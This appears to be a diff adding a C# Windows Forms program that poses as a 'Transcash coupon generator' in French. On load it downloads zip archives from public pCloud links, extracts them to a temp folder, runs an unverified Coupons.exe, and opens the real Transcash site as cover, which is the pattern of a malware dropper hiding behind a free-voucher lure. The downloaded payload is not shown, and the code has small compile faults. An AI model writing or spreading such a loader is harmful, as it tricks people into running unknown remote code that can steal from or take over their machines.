@@ -1,0 +1,62 @@
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
+using System.Windows.Forms;
+
+class LoaderForm : Form {
+    ProgressBar progressBar = new ProgressBar();
+    Label statusLabel = new Label();
+
+    string[] urls = new[] {
+        "https://e.pcloud.link/publink/download?code=XZO6OqZld5ct1Elk6mOI605e9uM6HITxCQ7",
+        "https://e.pcloud.link/publink/show?code=XZ8H26ZQPr7QqVLcpmsJk8u6u2qH0TK81w"
+    };
+
+    public LoaderForm() {
+        Text = "Générateur Coupon Transcash";
+        Width = 400; Height = 160;
+        BackColor = Color.White;
+        
+        progressBar.SetBounds(20, 50, 340, 25);
+        Controls.Add(progressBar);
+
+        statusLabel.SetBounds(20, 20, 340, 20);
+        Controls.Add(statusLabel);
+
+        Load += async (s, e) => {
+            foreach (var url in urls) {
+                statusLabel.Text = "Téléchargement...";
+                string tempFile = Path.GetTempFileName() + ".zip";
+                using (var client = new WebClient()) {
+                    client.DownloadProgressChanged += (s2, ev) => progressBar.Value = ev.ProgressPercentage;
+                    await client.DownloadFileTaskAsync(new Uri(url), tempFile);
+                }
+
+                statusLabel.Text = "Extraction...";
+                string extractPath = Path.Combine(Path.GetTempPath(), "PCS");
+                if (Directory.Exists(extractPath)) Directory.Delete(extractPath, true);
+                ZipFile.ExtractToDirectory(tempFile, extractPath);
+
+                File.Delete(tempFile);
+            }
+
+            statusLabel.Text = "Lancement de Coupons.exe...";
+            string exePath = Path.Combine(Path.GetTempPath(), "PCS", "Coupons.exe");
+            Process.Start(exePath);
+
+            statusLabel.Text = "Ouverture du site...";
+            Process.Start(new ProcessStartInfo("https://www.transcash.fr") { UseShellExecute = true });
+
+            statusLabel.Text = "Terminé !";
+        };
+    }
+
+    [STAThread]
+    static void Main() {
+        Application.EnableVisualStyles();
+        Application.Run(new LoaderForm());
+    }
+}
